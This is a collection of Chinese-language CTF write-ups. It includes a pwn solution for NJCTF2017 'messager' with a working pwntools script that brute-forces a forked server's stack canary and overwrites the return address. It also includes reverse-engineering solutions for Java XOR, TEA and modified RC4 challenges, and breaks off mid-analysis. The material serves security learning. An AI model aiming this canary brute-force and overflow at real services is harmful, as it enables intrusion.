[{"id":"93d43ea1d4ca04bfd8b5b6e2f9278ee0","title":"NJCTF2017:messagerWP","content":"Messager1.环境启动：第一道例题来自2017年的NJCTF，该程序本身就能通过socket进行通信，不需要用socat进行绑定，所以直接运行即可，端口为5555。\n$ echo \"Flag&#123;V2VDaGF0X3RoeXNjODMyXlhE&#125;\" > flag\n$ ./messager\n验证：\nnetstat -anp | grep messager\n2.程序分析：1.查看程序保护：首先file，checksec看一下程序：\n可以看到开了Canary和NX保护\n2.程序静态分析：用IDA打开分析程序：\n首先看main( )函数：\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n&#123;\n  int optval; // [rsp+0h] [rbp-10h] BYREF\n  __pid_t pid; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v6; // [rsp+8h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  read_flag();\n  puts(\"[+]start..\");\n  addr.sa_family = 2;\n  *(_WORD *)addr.sa_data = htons(0x15B3u);\n  *(_DWORD *)&amp;addr.sa_data[2] = htonl(0);\n  len = 16;\n  addr_len = 16;\n  pid = 0;\n  puts(\"[+]socket..\");\n  dword_602140 = socket(2, 1, 0);\n  if ( dword_602140 &lt; 0 )\n  &#123;\n    perror(\"socket\");                 //perror()函数的功能是打印一个系统错误信息\n    return 0xFFFFFFFFLL;\n  &#125;\n  optval = 1;\n  setsockopt(dword_602140, 1, 2, &amp;optval, 4u);\n  puts(\"[+]bind..\");\n  if ( bind(dword_602140, &amp;addr, len) &lt; 0 )\n  &#123;\n    perror(\"bind error\");\n    return 0xFFFFFFFFLL;\n  &#125;\n  puts(\"[+]listen..\");\n  if ( listen(dword_602140, 1024) &lt; 0 )\n  &#123;\n    perror(\"listen\");\n    return 0xFFFFFFFFLL;\n  &#125;\n  while ( 1 )\n  &#123;\n    fd = accept(dword_602140, &amp;stru_602130, &amp;addr_len);\n    if ( fd == -1 )\n    &#123;\n      perror(\"accept\");\n      return 0xFFFFFFFFLL;\n    &#125;\n    send(fd, \"Welcome!\\n\", 9uLL, 0);\n    pid = fork();\n    if ( pid == -1 )\n    &#123;\n      perror(\"fork\");\n      return 0xFFFFFFFFLL;\n    &#125;\n    if ( !pid )\n      break;\n    close(fd);\n  &#125;\n  signal(14, handler);\n  alarm(3u);\n  if ( (unsigned int)interaction() )\n  &#123;\n    if ( send(fd, \"Message receive failed\\n\", 0x19uLL, 0) == -1 )\n      goto LABEL_14;\n  &#125;\n  else if ( send(fd, \"Message received!\\n\", 0x12uLL, 0) == -1 )\n  &#123;\nLABEL_14:\n    perror(\"send\");\n    return 0xFFFFFFFFLL;\n  &#125;\n  return 0LL;\n&#125;\n\n第8行处可看出刚开始就调用了一个函数，这个函数的作用是读取flag文件\nssize_t read_flag()\n&#123;\n  int fd; // [rsp+Ch] [rbp-4h]\n\n  fd = open(\"./flag\", 0);\n  if ( fd &lt; 0 )\n  &#123;\n    perror(\"open flag failed\");\n    exit(0);\n  &#125;\n  return read(fd, &amp;unk_602160, 0x64uLL);\n&#125;\nhttps://magnificent-syrup-61f.notion.site/C-c034b8439f1c4c7db260ad6c40897363从第九行开始的就是常规的调用socket，bind，listen三个函数作为TCP服务器端程序的调用，关键在于37行的while循环，其调用的fork函数，大致意思就是当服务器接受到客户端的连接请求时从父进程分裂出一个子进程，根据fork函数的特性(此函数的变量pid装着fork的返回值)，主进程会继续while循环等待新的客户端连接，而分裂出的子进程则会跳出while循环调用interaction函数，与客户端进行对接。https://magnificent-syrup-61f.notion.site/fork-85adbf6101c14b2e9278840b3e5841df\n__int64 interaction()\n&#123;\n  __int64 result; // rax\n  char s[104]; // [rsp+10h] [rbp-70h] BYREF\n  unsigned __int64 v2; // [rsp+78h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  printf(\"csfd = %d\\n\", (unsigned int)fd);\n  bzero(s, 0x64uLL);        //该函数的功能是将指定内存块的前n个字节全部设置为零\n  if ( (unsigned int)recv(fd, s, 0x400uLL, 0) == -1 )\n  &#123;\n    perror(\"recv\");\n    result = 0xFFFFFFFFLL;\n  &#125;\n  else\n  &#123;\n    printf(\"Message come: %s\", s);\n    fflush(stdout);       //清空文件缓冲区\n    result = 0LL;\n  &#125;\n  return result;\n&#125;\n\n分析interaction函数可以发现字符串变量s在栈上申请的空间是104字节，而在接收函数recv处却申请了1024字节的空间，这里明显造成了栈的溢出。所以现在要做的就是分析如何利用这个漏洞。\n已知条件：\n\ncanary的大小为指针大小，64位程序，指针为8字节。\ncanary的低位为0x00\nfork函数的子进程是父进程的克隆\n\n通常情况下，对Canaries进行爆破是不太可能的。在32位下，除去低位固定的“\\x00”，还有0x100^3&#x3D;16 777 216种情况，64位则更多。另外，爆破意味着大量的崩溃，而程序重启后Canaries的值也会重新生成。但是同一个进程内包括复刻的子进程，它们的Canaries是不会变的，且子进程崩溃不会影响到主进程，这就给了我们爆破的机会。\n确认了fork出来的子函数的栈溢出不会导致主程序崩溃，所以每次fork出来的子程序cananry都等于主函数的canary，那么我们就可以一个字节一个字节的进行爆破根据进程崩溃与否来判断填充上去的字节是否正确。获得Canaries的值后，我们就可以在溢出时保持其不变，并覆盖返回地址，获得flag。\n最后就是确认要返回的地址是多少：\n这里是通过c语言网络编程知识确定的，已知send函数是向对方发送数据，而flag就在buf里面，所以我们的目的返回地址为：400BC6.\n.text:0000000000400BC6 sub_400BC6      proc near\n.text:0000000000400BC6 ; __unwind &#123;\n.text:0000000000400BC6                 push    rbp\n.text:0000000000400BC7                 mov     rbp, rsp\n.text:0000000000400BCA                 mov     eax, cs:fd\n.text:0000000000400BD0                 mov     ecx, 0          ; flags\n.text:0000000000400BD5                 mov     edx, 64h ; 'd'  ; n\n.text:0000000000400BDA                 mov     esi, offset unk_602160 ; buf\n.text:0000000000400BDF                 mov     edi, eax        ; fd\n.text:0000000000400BE1                 call    _send\n.text:0000000000400BE6                 nop\n.text:0000000000400BE7                 pop     rbp\n.text:0000000000400BE8                 retn\n.text:0000000000400BE8 ; &#125; // starts at 400BC6\n\n3.Payload：\n遇到的问题：\ncanary后面存放的是ebp的值，再后面才是要返回的地址。\npython3不支持前后连接不同类型的字符串,send里面既有字符串又有地址,解决方法是在地址(p64方法)后面加.decode(“iso-8859-1”)\n\n\n\nfrom pwn import  *\n\ndef leak_canary():\n    global canary\n    canary = \"\\x00\"\n    while len(canary) &lt; 8:\n        for x in range(256):\n            io = remote(\"127.0.0.1\",5555)\n            io.recv()\n\n            io.send(\"A\"*104 + canary + chr(x))\n            try:\n                io.recv()\n                canary += chr(x)\n                break\n            except:\n                continue\n            finally:\n                io.close()\n\ndef pwn():\n    io = remote(\"127.0.0.1\",5555)\n    io.recv()\n\n    io.send(\"A\"*104 + canary + \"A\"*8 + p64(0x400bc6).decode(\"iso-8859-1\"))\n    print (io.recvline())\n\nif __name__=='__main__':\n    leak_canary()\n    pwn()\n\n\n","slug":"NJCTF2017-messagerWP","date":"2022-03-15T05:59:29.000Z","categories_index":"PWN","tags_index":"WP","author_index":"Big Devils"},{"id":"dbf28d0c1562fa16371756c5d1c38cce","title":"2022年2月PragyanCTF比赛记录","content":"\n\n\nReverse\n考点\n\n\n\nOak\njava源代码，算法逆向\n\n\n\n\n\n\nOak\n题目描述\nJust little understanding of java would be enough Oak.class。\n\n\n\n\n源代码：\n  //\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\npublic class Oak &#123;\n    static long[] data = new long[]&#123;28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L&#125;;\n\n    public Oak() &#123;\n    &#125;\n\n    public static int t_helper(int var0, int[] var1) &#123;\n        if (var1[var0] != -1) &#123;\n            return var1[var0];\n        &#125; else if (var0 == 0) &#123;\n            var1[0] = 0;\n            return var1[0];\n        &#125; else if (var0 == 1) &#123;\n            var1[1] = 1;\n            return var1[1];\n        &#125; else if (var0 == 2) &#123;\n            var1[2] = 3;\n            return var1[2];\n        &#125; else &#123;\n            var1[var0] = 3 * t_helper(var0 - 1, var1) - 3 * t_helper(var0 - 2, var1) + t_helper(var0 - 3, var1);\n            return var1[var0];\n        &#125;\n    &#125;\n\n    public static int t(int var0) &#123;\n        int[] var1 = new int[var0 + 1];\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            var1[var2] = -1;\n        &#125;\n\n        return t_helper(var0, var1);\n    &#125;\n\n    public static void main(String[] args) &#123;\n        String[] var0= &#123;\"falg\"&#125;;\n        if (var0.length != 1) &#123;\n            System.out.println(\"Usage: [flag]\");\n        &#125; else &#123;\n            if (check(var0[0])) &#123;\n                System.out.println(\"Correct!\");\n            &#125; else &#123;\n                System.out.println(\"Incorrect\");\n            &#125;\n\n        &#125;\n    &#125;\n\n    public static long[] conv(String var0) &#123;\n        long[] var1 = new long[var0.length()];\n\n        for(int var2 = 0; var2 &lt; var0.length(); ++var2) &#123;\n            var1[var2] = (long)((var0.charAt(var2) &lt;&lt; 8) + var0.charAt((var2 + 1) % var0.length()));\n        &#125;         //var1的各元素有falg字符串的当前元素左移8位和后面一个元素取余串长组成\n\n        return var1;\n    &#125;\n\n    public static boolean check(String var0) &#123;\n        long[] var1 = conv(var0);\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            if (data[var2] != (var1[var2] ^ (long)t(var2 * var2))) &#123;\n                return false;\n            &#125;\n        &#125;\n\n        return true;\n    &#125;\n&#125;\n\n解体思路：\nmain函数判断输入，要求输入一个flag，而且只能输入一个字符串\n\n\n\n加密后的数据存在了data里面\n static long[] data = new long[]&#123;28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L&#125;;\n\n随后调用check函数\n public static boolean check(String var0) &#123;\n        long[] var1 = conv(var0);\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            if (data[var2] != (var1[var2] ^ (long)t(var2 * var2))) &#123;\n                return false;\n            &#125;\n        &#125;\n\n        return true;\n    &#125;\n 大致思路分两块，第一块将输入的flag传到conv函数变形，然后与t函数返回值进行异或操作，最后与data里的值判断是否相等\n\n所以先逆t函数：\n public static int t(int var0) &#123;\n    int[] var1 = new int[var0 + 1];\n    \n    for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n        var1[var2] = -1;\n    &#125;\n    \n    return t_helper(var0, var1);\n&#125;\n t函数又调用了t_helper函数\n public static int t_helper(int var0, int[] var1) &#123;\n        if (var1[var0] != -1) &#123;\n            return var1[var0];\n        &#125; else if (var0 == 0) &#123;\n            var1[0] = 0;\n            return var1[0];\n        &#125; else if (var0 == 1) &#123;\n            var1[1] = 1;\n            return var1[1];\n        &#125; else if (var0 == 2) &#123;\n            var1[2] = 3;\n            return var1[2];\n        &#125; else &#123;\n            var1[var0] = 3 * t_helper(var0 - 1, var1) - 3 * t_helper(var0 - 2, var1) + t_helper(var0 - 3, var1);\n            return var1[var0];\n        &#125;\n    &#125;\n 看似复杂其实可以注意到传到t函数的值实际上是死的，分析它没有任何意义，逆向算法时直接照搬就行\n\n接着分析第一块：\n public static long[] conv(String var0) &#123;\n        long[] var1 = new long[var0.length()];\n\n        for(int var2 = 0; var2 &lt; var0.length(); ++var2) &#123;\n            var1[var2] = (long)((var0.charAt(var2) &lt;&lt; 8) + var0.charAt((var2 + 1) % var0.length()));\n        &#125;         //var1的各元素有falg字符串的当前元素左移8位和后面一个元素取余串长组成\n\n        return var1;\n    &#125;\n 一开始的思路是从最后元素逆推回来，但是很麻烦，这里其实可以利用位运算的特性直接解，因为每个加密后的元素是先左移8位在加上后面那个未加密的元素，那么我们直接把前面八位置零就可以轻松获得后面一位的值用这种方法依次类推，flag就出来了\n\n\nexp编写：逆向思路大概是逆t→与data异或→所有元素除了后8位，其他位置零：\npublic class exp &#123;\n    static long[] data = new long[]&#123;28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L&#125;;\n    public static int t_helper(int var0, int[] var1) &#123;\n        if (var1[var0] != -1) &#123;\n            return var1[var0];\n        &#125; else if (var0 == 0) &#123;\n            var1[0] = 0;\n            return var1[0];\n        &#125; else if (var0 == 1) &#123;\n            var1[1] = 1;\n            return var1[1];\n        &#125; else if (var0 == 2) &#123;\n            var1[2] = 3;\n            return var1[2];\n        &#125; else &#123;\n            var1[var0] = 3 * t_helper(var0 - 1, var1) - 3 * t_helper(var0 - 2, var1) + t_helper(var0 - 3, var1);\n            return var1[var0];\n        &#125;\n    &#125;\n\n    public static int t(int var0) &#123;\n        int[] var1 = new int[var0 + 1];\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            var1[var2] = -1;\n        &#125;\n\n        return t_helper(var0, var1);\n    &#125;\n\n    public static long[] conv(String var0) &#123;\n        long[] var1 = new long[var0.length()];\n\n        for(int var2 = 0; var2 &lt; var0.length(); ++var2) &#123;\n            var1[var2] = (long)((var0.charAt(var2) &lt;&lt; 8) + var0.charAt((var2 + 1) % var0.length()));\n        &#125;         //var1的各元素有falg字符串的当前元素左移8位和后面一个元素取余串长组成\n\n        return var1;\n    &#125;\n\n    public static void main(String[] args)&#123;\n        long[] var1 = new long[data.length];\n        for(int var2 = 0; var2 &lt; data.length; ++var2) &#123;\n            var1[var2] = (data[var2] ^ (long) t(var2 * var2));\n            System.out.print(var1[var2]);\n            System.out.print(\",\");\n        &#125;\n        \n\n        &#125;\n\n    &#125;\n\n前面的解密可以用题目的代码，后面置零就用python了：\nflag=\"\"\nrflag=[28767,24419,25460,29798,26235,31536,12402,29233,12647,26417,12654,28212,13436,31839,24430,28224,16461,19763,13101,11568,12390,26207,24394,18996,13430,30273,16735,24407,22369,24885,13663,24360,10281,10543,12124,23676,31804,15485,32112]\nfor i in range(39):\n    flag+=chr(rflag[i]&amp;127)\n\nt=(len(flag)-1)%len(flag)\nflag=flag[t:]+flag[:t]      //循环右移\nprint(flag)\n\np_ctf{0r1g1n4|n@M3-0f_J4vA_Wa5()&#x2F;|&lt;}\n","slug":"2022年2月PragyanCTF比赛记录","date":"2022-03-14T16:50:11.000Z","categories_index":"比赛记录","tags_index":"WP","author_index":"Big Devils"},{"id":"9c74912da0a2a9c3bea7b6b4717c1a49","title":"2022年2月SUSCTF比赛记录","content":"\n\n\nReverse\n考点\n\n\n\nDigitalCircuits\nexe→py，tea\n\n\n\n\n\n\nDigitalCircuitsexe→py:\n只要一看到这个图标就晓得大概率是py文件被打包成了exe，而且一般打包后的文件较大。直接用脚本解包。\npyinstxtractor.py DigitalCircuits.exe\n\n\n找到pyc文件之后在线网站反汇编就行\n算法分析：总体预览：反汇编后的代码为：\n#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\nimport time\n\ndef f1(a, b):\n    if a == '1' and b == '1':      //相当于，按位与操作\n        return '1'\n    return '0'\n\ndef f2(a, b):\n    if a == '0' and b == '0':     //相当于，按位或操作\n        return '0'\n    return '1'\n\ndef f3(a):                        //相当于，按位非操作\n    if a == '1':\n        return '0'\n    if a == '0':\n        return '1'\n\ndef f4(a, b):\n    return f2(f1(a, f3(b)), f1(f3(a), b))    //相当于，按位异或操作\n\ndef f5(x, y, z):\n    s = f4(f4(x, y), z)\n    c = f2(f1(x, y), f1(z, f2(x, y)))\n    return (s, c)\n\ndef f6(a, b):\n    ans = ''\n    z = '0'\n    a = a[::-1]\n    b = b[::-1]\n    for i in range(32):\n        ans += f5(a[i], b[i], z)[0]\n        z = f5(a[i], b[i], z)[1]\n\n    return ans[::-1]\n\ndef f7(a, n):                         //按位左移\n    return a[n:] + '0' * n\n\ndef f8(a, n):                         //按位右移\n    return n * '0' + a[:-n]\n\ndef f9(a, b):\n    ans = ''\n    for i in range(32):\n        ans += f4(a[i], b[i])\n\n    return ans\n\ndef f10(v0, v1, k0, k1, k2, k3):\n    s = '00000000000000000000000000000000'\n    d = '10011110001101110111100110111001'\n    for i in range(32):\n        s = f6(s, d)\n        v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))\n        v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))\n\n    return v0 + v1\n\nk0 = '0100010001000101'.zfill(32)    //zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。\nk1 = '0100000101000100'.zfill(32)\nk2 = '0100001001000101'.zfill(32)\nk3 = '0100010101000110'.zfill(32)\nflag = input('please input flag:')\nif flag[0:7] != 'SUSCTF&#123;' or flag[-1] != '&#125;':      //判断输入是否为SUSCTF&#123;&#125;包裹\n    print('Error!!!The formate of flag is SUSCTF&#123;XXX&#125;')\n    time.sleep(5)\n    exit(0)\nflagstr = flag[7:-1]\nif len(flagstr) != 24:                //实际flag长度为24\n    print('Error!!!The length of flag 24')\n    time.sleep(5)\n    exit(0)\nres = ''\nfor i in range(0, len(flagstr), 8):    //加密\n    v0 = flagstr[i:i + 4]\n    v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8)\n    v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8)\n    res += f10(v0, v1, k0, k1, k2, k3)\n\nif res == '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111':\n    print('True')\nelse:\n    print('False')\ntime.sleep(5)\n\n这里的难点就是识别加密算法，前面之所以定义这么多函数就是掩盖其加密算法的特征，从函数走向分析每一个for的用处(看注释)，分析78行到82行的加密循环\n加密循环分析：for i in range(0, len(flagstr), 8):    //加密\n    v0 = flagstr[i:i + 4]\n    v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8)\n    v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8)\n    res += f10(v0, v1, k0, k1, k2, k3)\n\nbin函数特征\n\n每轮循环的v0都是flag的值，每次存4个元素\n通过bin函数以字符串的形式返回每个元素二进制表达形式\n但是bin函数会自作主张的在前面加上0b，所以通过[2:]来切片将0b去掉\n再通过zfill补充去掉的前两位\n\n\nfor循环一次做8个元素，前四个元素放在了放在v0，后四个元素放在v1\nv0和v1都是以字符串的形式保存这元素的二进制表达\n调用f10加密函数，参数为v0，v1和四个key\n\n这里分析一下特征：密钥为128位，明文总共64位，分成两个32位\n符合这个条件的为TEA加密算法。\n为了进一步确认，分析f10函数：\nf10()函数：(TEA加密函数)def f10(v0, v1, k0, k1, k2, k3):\n    s = '00000000000000000000000000000000'\n    d = '10011110001101110111100110111001'\n    for i in range(32):\n        s = f6(s, d)\n        v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))\n        v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))\n\n定义两个变量：分别为s和d，联想到TEA加密算法也是同样的做法(定义sum和detal两个变量)，delta变量放着的是黄黄金分割律数字转换的一个数字 2654435769 （0x9E3779B9）,但这个函数是用二进制的形式表达的计算机换算一下\n\n这里就可以锁定加密算法使用的是TEA了\n确认算法后就可以直接写解密脚本了：\ndef TeaDecode(enc,k):\n    v0 = enc[0]\n    v1 = enc[1]\n    n = (delta * 32) &amp; 0xFFFFFFFF\n    for i in range(32):\n        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + n) ^ ((v0 >> 5) + k[3])\n        v1 &amp;= 0xFFFFFFFF\n        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + n) ^ ((v1 >> 5) + k[1])\n        v0 &amp;= 0xFFFFFFFF\n        n -= delta\n    return (v0, v1)\n\nenflag = '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111'\nenflag = [int(enflag[i:i + 32],2) for i in range(0, len(enflag), 32)]\n\nk = [0] * 4\nk[0] = int('0100010001000101'.zfill(32), 2)    #int(字符串或数字,进制(默认10进制))\nk[1] = int('0100000101000100'.zfill(32), 2)\nk[2] = int('0100001001000101'.zfill(32), 2)\nk[3] = int('0100010101000110'.zfill(32), 2)\ndelta = int('10011110001101110111100110111001', 2)\n\nflag = b''\nfor i in range(0,len(enflag),2):        #第三个参数为步进值\n    ans = TeaDecode(enflag[i:i + 2], k)\n    flag += ans[0].to_bytes(4, 'big') + ans[1].to_bytes(4, 'big')\n\nprint(b'SUSCTF&#123;' + flag + b'&#125;')\n\n","slug":"2022年2月SUSCTF比赛记录","date":"2022-03-14T13:33:40.000Z","categories_index":"比赛记录","tags_index":"WP","author_index":"Big Devils"},{"id":"87051f2935618f834bb08259aaf81b3c","title":"RC4逆向题实例2","content":"2021绿城杯eazy re1.基本信息探查：1.EXEinfo：无壳，32位\n\n2.运行一下：看到字符串“Hello, this is my world.If you want flag, give me something I like.”\n然后就是输入flag\n\n2.IDA分析：1.去花指令先是找到main函数，然后准备F5时，发现反汇编失败了：\n\n百度了一下这里加了花指令：\n.text:00401056                 xor     eax, eax\n.text:00401058                 jz      short near ptr loc_40105C+1\n\n首先是个异或指令，后面两个是同样一个寄存器，所以必定置0\njz这个跳转指令是根据ZF标志位是否为1，而ZF是判断结果是否为0，为0则置1\n所以说这里一定会跳转，那么后面的正常指令则无法执行。\n所以可以把jz这条指令nop掉(操作方式为：Edit→patch program→Assemble…)。\n这里记得把下面的数据转换为汇编代码(按C)\n2.主函数分析：1.确定整体思路：花指令去除后就可以F5分析代码了,下面是未修饰的反汇编代码：\nint __cdecl main(int argc, const char **argv, const char **envp)\n&#123;\n  unsigned int v3; // kr00_4\n  unsigned int v4; // kr04_4\n  int i; // ecx\n  int v6; // edi\n  int v7; // ebx\n  unsigned __int8 v8; // dl\n  int v9; // edi\n  int v10; // ebx\n  unsigned __int8 v11; // dl\n  int v12; // ecx\n  unsigned int j; // ecx\n  char *v14; // eax\n  char v16; // [esp-1Ch] [ebp-55Ch]\n  char v17; // [esp+0h] [ebp-540h]\n  char v18; // [esp+0h] [ebp-540h]\n  __int128 v19[2]; // [esp+Ch] [ebp-534h]\n  int v20; // [esp+2Ch] [ebp-514h]\n  int v21; // [esp+30h] [ebp-510h]\n  __int16 v22; // [esp+34h] [ebp-50Ch]\n  int v23; // [esp+38h] [ebp-508h]\n  char v24[512]; // [esp+3Ch] [ebp-504h] BYREF\n  char v25[256]; // [esp+23Ch] [ebp-304h] BYREF\n  char v26[256]; // [esp+33Ch] [ebp-204h] BYREF\n  char v27[256]; // [esp+43Ch] [ebp-104h] BYREF\n\n  memset(v27, 0, sizeof(v27));\n  strcpy(v26, \"tallmewhy\");\n  memset(&amp;v26[10], 0, 0xF6u);\n  v19[0] = xmmword_4021B0;\n  v19[1] = xmmword_4021C0;\n  v20 = 1424414361;\n  v21 = 340807546;\n  v22 = -4891;\n  puts(\"Hello, this is my world.If you want flag, give me something I like.\");\n  sub_401010(\"\\\\n\", v16);\n  memset(v24, 0, sizeof(v24));\n  gets(v24);\n  v3 = strlen(v24);\n  v4 = strlen(v26);\n  memset(v25, 0, sizeof(v25));\n  for ( i = 0; i &lt; 256; ++i )\n  &#123;\n    v27[i] = i;\n    v25[i] = v26[i % v4];\n  &#125;\n  v6 = 0;\n  v7 = 0;\n  do\n  &#123;\n    v8 = v27[v6];\n    v7 = (v7 + v25[v6] + v8) % 256;\n    v27[v6++] = v27[v7];\n    v27[v7] = v8 ^ 0x37;\n  &#125;\n  while ( v6 &lt; 256 );\n  sub_401010(\"\\\\n\\\\n\", v17);\n  v9 = 0;\n  v23 = 0;\n  v10 = 0;\n  if ( v3 )\n  &#123;\n    do\n    &#123;\n      v9 = (v9 + 1) % 256;\n      v11 = v27[v9];\n      v10 = (v11 + v10) % 256;\n      v27[v9] = v27[v10];\n      v27[v10] = v11;\n      v12 = v23;\n      v24[v23] ^= v27[(unsigned __int8)(v11 + v27[v9])];\n      v23 = v12 + 1;\n    &#125;\n    while ( v12 + 1 &lt; v3 );\n    v10 = 0;\n  &#125;\n  for ( j = 0; j &lt; v3; ++j )\n    v10 = v24[j] == *((_BYTE *)v19 + j);\n  v14 = (char *)&amp;unk_402184;\n  if ( v10 == 1 )\n    v14 = aGood;\n  sub_401010(v14, v18);\n  return 0;\n&#125;\n\n先从下面开始看，81行有个if，判断v10是否为真，为真则输出good，否则输出的为80行所赋的值(跟过去可以看到“soory I don‘t like your stuff.”)，也就是我们的目的是让v10位真，而v10成真的条件为78行的for循环(这里也就是说是判断flag的地方)对于v24和v19的比较\n2.密文提取：v19为gets的值，查看v24中的赋值：\n这大概就是要比较的值，而且注意汇编代码和反汇编代码：\n.text:004010A8                 movaps  xmm0, ds:xmmword_4021B0\n.text:004010AF                 movups  [ebp+rflag], xmm0\n.text:004010B6                 push    offset Buffer   ; \"Hello, this is my world.If you want fla\"...\n.text:004010BB                 movaps  xmm0, ds:xmmword_4021C0\n.text:004010C2                 movups  [ebp+var_524], xmm0\n.text:004010C9                 mov     [ebp+var_514], 54E6D699h\n.text:004010D3                 mov     [ebp+var_510], 14504F7Ah\n.text:004010DD                 mov     [ebp+var_50C], 0ECE5h\n__int128 v19[2]; // [esp+Ch] [ebp-534h]\n  int v20; // [esp+2Ch] [ebp-514h]\n  int v21; // [esp+30h] [ebp-510h]\n  __int16 v22; // [esp+34h] [ebp-50Ch]\n\n31到35行的赋值其实是连续的，这里可能ida识别错了。\n提取v19的值:\n选中数据段的值，按Shift+E 弹出Export data对话框：\nF58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B\n\n这里注意的是rdata的值是小端存储的，在对话框已经自动转换了，但后面几个变量没有，得自己改：\n先把这些变量的值改成十六进制(按H)\nv20 = 0x54E6D699;\nv21 = 0x14504F7A;\nv22 = 0xECE5;\n\n最终数据为：\nF58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B99D6E6547A4F5014E5EC\n\n这里为了方便之后编写exp这里写了个脚本将内容分段：\nrflag = \"F58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B99D6E6547A4F5014E5EC\"\nflag = \"\"\nhaha = \"0x\"\nhehe = \",\"\nfor i in range(len(rflag)):\n    if i+1 >= len(rflag):\n        break\n    flag += haha + rflag[i] + rflag[i+1] +hehe\n    i = i + 1\nflag = flag[0:len(flag)-1]\nprint(flag)\n0xF5,0x58,0x8C,0xC8,0x8D,0xDE,0xE4,0x49,0x9F,0xFA,0xA5,0x52,0x28,0x86,0x65,0x53,0x30,0x0F,0xF4,0x4E,0xEB,0xBD,0xD3,0x32,0x24,0x4A,0xA9,0x99,0x91,0x11,0x1A,0xA6,0x6F,0xFD,0xD4,0x46,0x6A,0xAD,0xD7,0x70,0x0B,0xB8,0x8D,0xDE,0xE8,0x8B,0xB8,0x88,0x83,0x34,0x4A,0xA5,0x5A,0xA6,0x6E,0xEB,0xBE,0xEC,0xCB,0xBF,0xF4,0x44,0x4B,0xB9,0x99,0x9D,0xD6,0x6E,0xE6,0x65,0x54,0x47,0x7A,0xA4,0x4F,0xF5,0x50,0x01,0x14,0x4E,0xE5,0x5E,0xEC\n\n这一步纯属好玩，哈哈。接下来就是真实分析函数了：\n3.算法分析\n首先看第一个循环：\nfor ( i = 0; i &lt; 256; ++i )\n&#123;\n  v27[i] = i;                  \n  v25[i] = v26[i % v4];        \n&#125;\n\n这里也就是RC4中的s盒初始化的部分了，v27为s盒，v25为t盒，v26位key\n\n第二个循环：\nv6 = 0;\nv7 = 0;\ndo\n&#123;\n  v8 = S_box[v6];\n  v7 = (v7 + T_box[v6] + v8) % 256;\n  S_box[v6++] = S_box[v7];\n  S_box[v7] = v8 ^ 0x37;\n&#125;\nwhile ( v6 &lt; 256 );\n\n这里和正常的RC4加密不同，加了一个v8变量一般来说做完5、6行就是S_box[v6] 、S_box[v7]的值进行交换，但这里不同S_box[v6]的值是正常存S_box[v7]的值，不过S_box[v7]的值存放的是S_box[v6] ^0x37,正常的RC4是不会改动s盒的，但在这个算法中s盒的值被改动了。\n\n最后一个循环按照RC4的加密算法来说这里做的就是对明文的加密了：\nv9 = 0;\nv23 = 0;\nv10 = 0;\nif ( v3 )\n&#123;\n  do\n  &#123;\n    v9 = (v9 + 1) % 256;\n    v11 = S_box[v9];\n    v10 = 